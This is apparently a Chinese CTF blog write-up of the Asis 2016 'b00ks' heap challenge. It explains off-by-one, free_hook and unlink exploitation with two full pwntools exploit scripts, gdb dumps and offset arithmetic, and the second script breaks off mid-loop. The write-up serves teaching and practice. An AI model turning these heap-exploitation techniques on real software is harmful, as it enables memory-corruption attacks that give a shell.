<p>他由于没考虑好边界条件，多写了一个0到末尾<br>书本结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">char</span> *description;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><p>我先说明下攻击过程，下面的讲解会围绕这个攻击过程来</p>
<ol>
<li>填充满author</li>
<li>创建堆块1，覆盖author结尾的\x00,这样我们输出的时候就可以泄露堆块1的地址</li>
<li>创建堆块2，为后续做准备，堆块2要申请得比较大，因为mmap申请出来的堆块地址与libc有固定的偏移</li>
<li>泄露堆块1地址，记为first_heap</li>
<li><strong>(关键点来了)</strong> 这时候的攻击思路是利用编辑author的时候多写了一个\x00字节，可以覆盖到堆块1的地址的最后一位，如果我们提前将堆块1的内容编辑好，按照上述的结构体布置好，name和description我们自己控制，伪造成一个书本的结构体，然后让覆盖过后的地址刚好是book1的description部分的话，我们相当于获得了一个任意地址读写的能力啊</li>
<li>后面就简单了，任意读取获得libc地址</li>
<li>任意写将__free_hook函数的地址改写成one_gadget地址</li>
</ol>
<p>tips:__free_hook若没有则不调用，若有将先于free函数调用</p>
<h5 id="先贴上exp，没有代码，没有调试就没有灵魂"><a href="#先贴上exp，没有代码，没有调试就没有灵魂" class="headerlink" title="先贴上exp，没有代码，没有调试就没有灵魂"></a>先贴上exp，没有代码，没有调试就没有灵魂</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">'b00ks'</span>)</span><br><span class="line"></span><br><span class="line">LIBC = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">host = args.HOST <span class="keyword">or</span> <span class="string">'127.0.0.1'</span></span><br><span class="line">port = int(args.PORT <span class="keyword">or</span> <span class="number">1080</span>)</span><br><span class="line">ctx.binary = <span class="string">'b00ks'</span></span><br><span class="line">ctx.remote_libc = LIBC</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> ctx.debug_remote_libc == <span class="literal">False</span>:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ctx.remote_libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(book_size, book_name, desc_size, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(book_size))</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">if</span> len(book_name) == book_size:<span class="comment">#deal with overflow</span></span><br><span class="line">        io.send(book_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(book_name)</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(desc_size))</span><br><span class="line">    <span class="keyword">if</span> len(desc) == desc_size:</span><br><span class="line">        io.send(desc)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(desc))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printbook</span><span class="params">(id)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(id):</span><br><span class="line">        book_id = int(io.readline()[:<span class="number">-1</span>])</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_name = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_des = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_author = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">author_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">    create(<span class="number">48</span>, <span class="string">'1a'</span>, <span class="number">240</span>, <span class="string">'1b'</span>) <span class="comment">#1</span></span><br><span class="line">    create(<span class="number">0x21000</span>, <span class="string">'2a'</span>, <span class="number">0x21000</span>, <span class="string">'2b'</span>)<span class="comment">#2</span></span><br><span class="line">    book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">    first_heap = u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">'first_heap: 0x%x'</span> % first_heap)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    payload =  <span class="string">'a'</span>*<span class="number">0xa0</span> + p64(<span class="number">1</span>) + p64(first_heap + <span class="number">0x38</span>) + p64(first_heap + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    author_name(<span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">    book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">    book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    book2_des_addr = u64(book_des.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"book2 name addr: 0x%x"</span> % book2_name_addr)</span><br><span class="line">    io.success(<span class="string">"book2 des addr: 0x%x"</span> % book2_des_addr)</span><br><span class="line">    libc_base = book2_des_addr - <span class="number">0x5a8010</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    offset = <span class="number">0x45216</span> </span><br><span class="line">    offset = <span class="number">0x4526a</span> </span><br><span class="line">    <span class="comment">#offset = 0xf02a4 </span></span><br><span class="line">    <span class="comment">#offset = 0xf1147</span></span><br><span class="line">    one_gadget = libc_base + offset</span><br><span class="line">    io.success(<span class="string">"free_hook addr: 0x%x"</span> % free_hook)</span><br><span class="line">    io.success(<span class="string">"one_gadget addr: 0x%x"</span> % one_gadget)</span><br><span class="line">    payload = p64(free_hook)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    edit(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
<p>我只讲解exp函数内的内容，外面的那些只是为了方便堆块的申请，输出，删除什么的，堆题建议都写成函数，因为将会有大量重复动作</p>
<h5 id="填满author"><a href="#填满author" class="headerlink" title="填满author"></a>填满author</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br></pre></td></tr></table></figure>
<p>具体查找author位置可以跟我一样，find 字符串</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ find author</span><br><span class="line">Searching for 'author' in: None ranges</span><br><span class="line">Found <span class="number">8</span> results, display max <span class="number">8</span> items:</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bcd83e1</span> (<span class="string">"author name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bcd8401</span> (<span class="string">"author name: "</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bcd841c</span> (<span class="string">"author_name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed83e1</span> (<span class="string">"author name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed8401</span> (<span class="string">"author name: "</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed841c</span> (<span class="string">"author_name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed905a</span> --&gt; <span class="number">0xa160726f68747561</span> </span><br><span class="line">    [<span class="built_in">stack</span>] : <span class="number">0x7ffed60b6406</span> (<span class="string">"author name: "</span>)</span><br></pre></td></tr></table></figure>

<p>这是创建一个堆块过后的效果，第三行便是book1结构体地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">20</span>gx <span class="number">0x555b3bed905a</span><span class="number">-0x2</span><span class="number">-0x18</span></span><br><span class="line"><span class="number">0x555b3bed9040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555b3bed9050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x726f687475616161</span></span><br><span class="line"><span class="number">0x555b3bed9060</span>:	<span class="number">0x0000555b3bf8a160</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed9070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed9080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed9090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<h5 id="创建堆块1"><a href="#创建堆块1" class="headerlink" title="创建堆块1"></a>创建堆块1</h5><p>相信我，这里是这道题最难的地方，过了这个坎就很简单了，每个人环境不同，处理的结果也不一样，所以自行调试，在这里我能给你的建议就是将description申请大一点，泄露部分不需要这里大小控制，先不讲，你先调试到能泄露就行</p>
<h5 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h5><p>这个不多讲</p>
<h5 id="通过edit伪造book结构体"><a href="#通过edit伪造book结构体" class="headerlink" title="通过edit伪造book结构体"></a>通过edit伪造book结构体</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =  <span class="string">'a'</span>*<span class="number">0xa0</span> + p64(<span class="number">1</span>) + p64(first_heap + <span class="number">0x38</span>) + p64(first_heap + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br></pre></td></tr></table></figure>
<p>这前面的偏移是看个人环境的，网上的很多没有偏移，在我电脑环境上做不到，我通过这个偏移能刚好对齐，具体调试过程就是繁杂的了，总之，你要让你覆盖掉堆块1的地址那部分，刚好在book1的description指针指向的空间里，这样你才能自行伪造结构体<br>比如<br>我泄露出来的第一个堆块地址为这个[+] first_heap: 0x55b6b5d72160<br>那这时候我覆盖过后地址就变成[+] first_heap: 0x55b6b5d72100，你要让0x55b6b5d72100在description指向的空间内就成了，建议将description申请的大一些，这样容易做到，这部分跟创建堆块1是结合起来的，你看我创建的大小在你那不一定准确</p>
<h5 id="这时候再次利用off-by-one"><a href="#这时候再次利用off-by-one" class="headerlink" title="这时候再次利用off by one"></a>这时候再次利用off by one</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">author_name(<span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br></pre></td></tr></table></figure>
<p>将地址最低位覆盖成\x00,这样我们我们的那个堆块1的指针就指向了我们自己伪造的结构体了，这个结构体description和name我们指向了book2结构体，这样我们通过编辑堆块1的description就能改掉book2的结构体的description指针和name指针，我们能编辑book2的description，相当于任意写了</p>
<h5 id="这里部分就只是泄露了"><a href="#这里部分就只是泄露了" class="headerlink" title="这里部分就只是泄露了"></a>这里部分就只是泄露了</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"book2 name addr: 0x%x"</span> % book2_name_addr)</span><br><span class="line">io.success(<span class="string">"book2 des addr: 0x%x"</span> % book2_des_addr)</span><br><span class="line">libc_base = book2_des_addr - <span class="number">0x5a8010</span></span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">offset = <span class="number">0x45216</span> </span><br><span class="line">offset = <span class="number">0x4526a</span> </span><br><span class="line"><span class="comment">#offset = 0xf02a4 </span></span><br><span class="line"><span class="comment">#offset = 0xf1147</span></span><br><span class="line">one_gadget = libc_base + offset</span><br><span class="line">io.success(<span class="string">"free_hook addr: 0x%x"</span> % free_hook)</span><br><span class="line">io.success(<span class="string">"one_gadget addr: 0x%x"</span> % one_gadget)</span><br></pre></td></tr></table></figure>

<p>这里那个固定偏移，第一部分libc_base我是通过vmmap获得libc基地址，然后我调试的时候减一下就获得这个固定偏移了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                Perm	Name</span><br><span class="line"><span class="number">0x0000564350ee5000</span> <span class="number">0x0000564350ee7000</span> r-xp	/tmp/pwn/b00ks_debug</span><br><span class="line"><span class="number">0x00005643510e6000</span> <span class="number">0x00005643510e7000</span> r--p	/tmp/pwn/b00ks_debug</span><br><span class="line"><span class="number">0x00005643510e7000</span> <span class="number">0x00005643510e8000</span> rw-p	/tmp/pwn/b00ks_debug</span><br><span class="line"><span class="number">0x0000564351cdd000</span> <span class="number">0x0000564351cff000</span> rw-p	[heap]</span><br><span class="line"><span class="number">0x00007f2805862000</span> <span class="number">0x00007f2805a22000</span> r-xp	/home/greenhand/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805a22000</span> <span class="number">0x00007f2805c22000</span> ---p	/home/greenhand/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805c22000</span> <span class="number">0x00007f2805c26000</span> r--p	/home/greenhand/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805c26000</span> <span class="number">0x00007f2805c28000</span> rw-p	/home/greenhand/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805c28000</span> <span class="number">0x00007f2805c2c000</span> rw-p	mapped</span><br><span class="line"><span class="number">0x00007f2805c2c000</span> <span class="number">0x00007f2805c52000</span> r-xp	/tmp/ld.so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007f2805e0a000</span> <span class="number">0x00007f2805e51000</span> rw-p	mapped</span><br><span class="line"><span class="number">0x00007f2805e51000</span> <span class="number">0x00007f2805e52000</span> r--p	/tmp/ld.so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007f2805e52000</span> <span class="number">0x00007f2805e53000</span> rw-p	/tmp/ld.so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007f2805e53000</span> <span class="number">0x00007f2805e54000</span> rw-p	mapped</span><br><span class="line"><span class="number">0x00007ffd06df4000</span> <span class="number">0x00007ffd06e15000</span> rw-p	[<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">0x00007ffd06edc000</span> <span class="number">0x00007ffd06edf000</span> r--p	[vvar]</span><br><span class="line"><span class="number">0x00007ffd06edf000</span> <span class="number">0x00007ffd06ee1000</span> r-xp	[vdso]</span><br></pre></td></tr></table></figure>
<p>在heap下面权限为r-xp的start部分的地址就是libc基地址了，<br>然后任选一个泄露的<br>[+] book2 name addr: 0x7f2805e2c010<br>[+] book2 des addr: 0x7f2805e0a010<br>我选了description部分的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">└──╼ $python</span><br><span class="line">Python <span class="number">2.7</span><span class="number">.16</span> (<span class="keyword">default</span>, Apr  <span class="number">6</span> <span class="number">2019</span>, <span class="number">01</span>:<span class="number">42</span>:<span class="number">57</span>) </span><br><span class="line">[GCC <span class="number">8.3</span><span class="number">.0</span>] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; hex(<span class="number">0x7f2805e0a010</span><span class="number">-0x00007f2805862000</span>)</span><br><span class="line">'0x5a8010'</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>就是这个固定偏移了</p>
<p>至于libc跟one_gadget偏移，用工具吧one_gadget</p>
<h5 id="最后任意地址写"><a href="#最后任意地址写" class="headerlink" title="最后任意地址写"></a>最后任意地址写</h5><ol>
<li>先编辑book1的description改成free_hook地址，就是将book2的description指针指向free_hook</li>
<li>编辑book2的description，就是写入one_gadget了</li>
<li>最后在调用一次free就可以getshell了<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(free_hook)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">edit(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line">remove(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>


</li>
</ol>
<h4 id="unlink原理"><a href="#unlink原理" class="headerlink" title="unlink原理"></a>unlink原理</h4><p>void unlink(malloc_chunk *P, malloc_chunk *BK, malloc_chunk *FD)</p>
<p>{</p>
<pre><code>FD = P-&gt;fd;

BK = P-&gt;bk;

FD-&gt;bk = BK;

BK-&gt;fd = FD;</code></pre><p>}<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">ctf-wiki讲解原理</a><br>我觉得那张图配的十分好，就是双向链表的解链过程，好好理解，不理解没法搞下去</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> pre_size;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> *fd; <span class="comment">//前驱指针 forward</span></span><br><span class="line">    <span class="keyword">char</span> *bk; <span class="comment">// 后继指针 back</span></span><br><span class="line">    数据部分</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大概就是这样，我创建三个这个结构体，a,b,c连接部分如下图，<br>链表： a&lt;-&gt;b&lt;-&gt;c<br>将b从链表中解链就是unlink<br>过程：</p>
<ol>
<li>FD = b-&gt;fd; //实际就是FD=a</li>
<li>BK = b-&gt;bk; //实际就是BK=c</li>
<li>FD-&gt;bk = BK; //就是从a-&gt;b变成a-&gt;c</li>
<li>BK-&gt;fd = FD; //就是从c-&gt;b变成c-&gt;a</li>
</ol>
<p>那unlink为什么能利用，进行攻击呢？我也纠结了这个很久，从ctf-wiki上了解的过去的unlink就不讲了，那时候的攻击方式比较简单，我只讲现今的unlink攻击方式<br>我们可以通过伪造chunk，让他解链的时候unlink一个我们伪造的chunk，这样的话，我们实际就达到了一个赋值的效果，而具体的效果从例子中讲解吧</p>
<h5 id="unlink攻击过程"><a href="#unlink攻击过程" class="headerlink" title="unlink攻击过程"></a>unlink攻击过程</h5><ol>
<li>利用off-by-one覆盖掉结果的null字节，泄露第一个堆块的地址</li>
<li>泄露掉后利用unlink，使得堆块4的mem部分的指针指向ptr-0x18处，ptr-0x18为自定义的地址，其实就是堆块4，就是create出来的那个堆块</li>
<li>覆盖堆块4的内容，修改了堆块4的description的指针，指向了堆块6的description部分的指针</li>
<li>其实第三部分就相当于获得了一个任意地址读写的指针</li>
<li>这里有好几次修改容易绕晕，我绕了两天才绕出来，第一次修改的时候是将chunk4整体改写，从开头到description指针，全部改掉，将chunk4的description指向chunk6结构体的description</li>
<li>然后第二次编辑的时候就是编辑chunk6结构体的description，这样就可以修改chunk6的description指针指向任意地点</li>
<li>利用这个特性输出，输出了libc的地址，具体libc在哪个位置可以通过调试得到</li>
<li>利用这个特性任意地址写<br>先对整体过程有个大概的了解，在一步步讲</li>
</ol>
<h5 id="过程中的坑"><a href="#过程中的坑" class="headerlink" title="过程中的坑"></a>过程中的坑</h5><ol>
<li>开头remove两次是有原因的，这样会让堆块6的结构体在前面几个堆块内，因为堆块同样大小的在free过后在malloc后会再次利用，这样方便我们自己调试查看以及利用</li>
<li>调试时候的计算问题，可以用你当时调试出来的减去后两位数字，获得个heap_base这样直接利用heap_base + 偏移比较快计算结果</li>
<li>当申请不是16的整数倍的时候，他会转换成16的整数倍，比如我exp中的0x108，实际大小会变成111，还有个1是标记的，他会将下一个chunk的pre_size拿来使用，因为没有free的话，pre_size是没用的，为了不浪费空间，就使用了</li>
</ol>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">'b00ks'</span>)</span><br><span class="line"></span><br><span class="line">LIBC = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">host = args.HOST <span class="keyword">or</span> <span class="string">'127.0.0.1'</span></span><br><span class="line">port = int(args.PORT <span class="keyword">or</span> <span class="number">1080</span>)</span><br><span class="line">ctx.binary = <span class="string">'b00ks'</span></span><br><span class="line">ctx.remote_libc = LIBC</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> ctx.debug_remote_libc == <span class="literal">False</span>:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ctx.remote_libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(book_size, book_name, desc_size, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(book_size))</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">if</span> len(book_name) == book_size:<span class="comment">#deal with overflow</span></span><br><span class="line">        io.send(book_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(book_name)</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(desc_size))</span><br><span class="line">    <span class="keyword">if</span> len(desc) == desc_size:</span><br><span class="line">        io.send(desc)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(desc))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span><span class="params">()</span>:</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">author_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">'11111'</span>, <span class="number">0x20</span>, <span class="string">'b'</span>) <span class="comment">#1</span></span><br><span class="line">    printf()</span><br><span class="line">    io.recvuntil(<span class="string">'Author: '</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"author"</span>)</span><br><span class="line">    first_heap = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"22222"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#2</span></span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#3</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x108</span>, <span class="string">'overflow'</span>) <span class="comment">#4</span></span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"44444"</span>, <span class="number">0x100</span><span class="number">-0x10</span>, <span class="string">'target'</span>) <span class="comment">#5</span></span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"/bin/sh\x00"</span>, <span class="number">0x200</span>, <span class="string">'to arbitrary read and write'</span>) <span class="comment">#6</span></span><br><span class="line">    heap_base = first_heap - <span class="number">0x80</span></span><br><span class="line">    ptr = heap_base + <span class="number">0x180</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) + <span class="string">'\x00'</span>*<span class="number">0xe0</span> + p64(<span class="number">0x100</span>)</span><br><span class="line">    edit(<span class="number">4</span>, payload)</span><br><span class="line">    remove(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0x30</span>) + p64(<span class="number">4</span>) + p64(first_heap+<span class="number">0x40</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">4</span>, payload)</span><br><span class="line">    edit(<span class="number">4</span>, p64(heap_base + <span class="number">0x1e0</span>))</span><br><span class="line">    printf()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span 